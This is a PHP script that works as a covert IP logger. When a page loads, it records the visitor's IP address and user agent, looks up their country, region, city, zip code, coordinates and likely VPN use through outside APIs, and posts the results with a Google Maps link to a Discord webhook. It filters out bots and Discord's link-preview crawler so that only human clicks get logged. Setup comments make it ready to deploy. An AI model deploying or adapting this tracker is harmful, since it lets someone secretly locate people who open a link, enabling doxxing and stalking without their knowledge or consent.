<?php

/* 
Please keep this copyright statement intact
Creator: Jeroenimo02#2380
Publish Date: 19-03-2021
Last Update: 18-03-2022
APIs Provided By: geoiplookup.io and ip-api.com
*/ 

//Get the visitor's IP
$IP = (isset($_SERVER["HTTP_CF_CONNECTING_IP"]) ? $_SERVER["HTTP_CF_CONNECTING_IP"] : $_SERVER['REMOTE_ADDR']);
$Browser = $_SERVER['HTTP_USER_AGENT'];

//Stop the bots from logging
if (preg_match('/bot|Discord|robot|curl|spider|crawler|^$/i', $Browser)) {
    exit();
}

//YOU CAN SET YOUR TIMEZONE HERE!
date_default_timezone_set("Europe/Amsterdam");
$Date = date('d/m/Y');
$Time = date('G:i:s');

//Check if IP is a VPN (Is not always correct!)
$Details = json_decode(file_get_contents("http://ip-api.com/json/{$IP}"));
$VPNConn = json_decode(file_get_contents("https://json.geoiplookup.io/{$IP}"));
if ($VPNConn->connection_type === "Corporate") {
    $VPN = "Yes";
} else {
    $VPN = "No";
}

//Set some variables
$Country = $Details->country;
$CountryCode = $Details->countryCode;
$Region = $Details->regionName;
$City = $Details->city;
$Zip = $Details->zip;
$Lat = $Details->lat;
$Lon = $Details->lon;
$WebhookName = $IP;
//Old method of getting a flag picture
//$Flag = "https://www.countryflags.io/{$Details->countryCode}/flat/64.png";
$Details->countryCode = strtolower($Details->countryCode);
$FlagOLD = "https://raw.githubusercontent.com/stevenrskelton/flag-icon/master/png/75/country-4x3/{$Details->countryCode}.png";
$Flag = "https://countryflagsapi.com/png/{$Details->countryCode}";


class Discord
{

	//This will run and send as soon as the page loads
    public function Visitor()
    {
        global $IP, $Browser, $Date, $Time, $VPN, $Country, $CountryCode, $Region, $City, $Zip, $Lat, $Lon, $WebhookName, $Flag;

		//Insert FULL webhook URL here (URL begins with: https://discord.com/api/webhooks/)
        $Webhook = "FULLURLHERE";

        $InfoArr = array(
            "username" => "$WebhookName",
            "avatar_url" => "$Flag",
            "embeds" => [array(

                "title" => "Visitor From $Country",
                "color" => "39423",

                "fields" => [array(
                    "name" => "IP",
                    "value" => "$IP",
                    "inline" => true
                ),
                    array(
                        "name" => "VPN?",
                        "value" => "$VPN",
                        "inline" => true
                    ),
                    array(
                        "name" => "Useragent",
                        "value" => "$Browser"
                    ),
                    array(
                        "name" => "Country/CountryCode",
                        "value" => "$Country/$CountryCode",
                        "inline" => true
                    ),
                    array(
                        "name" => "Region | City | Zip",
                        "value" => "[$Region | $City | $Zip](https://www.google.com/maps/search/?api=1&query=$Lat,$Lon 'Google Maps Location (+/- 750M Radius)')",
                        "inline" => true
                    )],

                "footer" => array(
                    "text" => "$Date $Time",
					//Alarm-clock icon for the footer. You could also download the image and set the icon_url to the image path
                    "icon_url" => "https://e7.pngegg.com/pngimages/766/619/png-clipart-emoji-alarm-clocks-alarm-clock-time-emoticon.png"
                ),
            )],
        );

		//Some code that sends the info as an embed to Discord
        $JSON = json_encode($InfoArr);

        $Curl = curl_init($Webhook);
        curl_setopt($Curl, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
        curl_setopt($Curl, CURLOPT_CUSTOMREQUEST, "POST");
        curl_setopt($Curl, CURLOPT_POSTFIELDS, $JSON);
        curl_setopt($Curl, CURLOPT_RETURNTRANSFER, true);
		
		//En voilà
        return curl_exec($Curl);

    }
}

?>
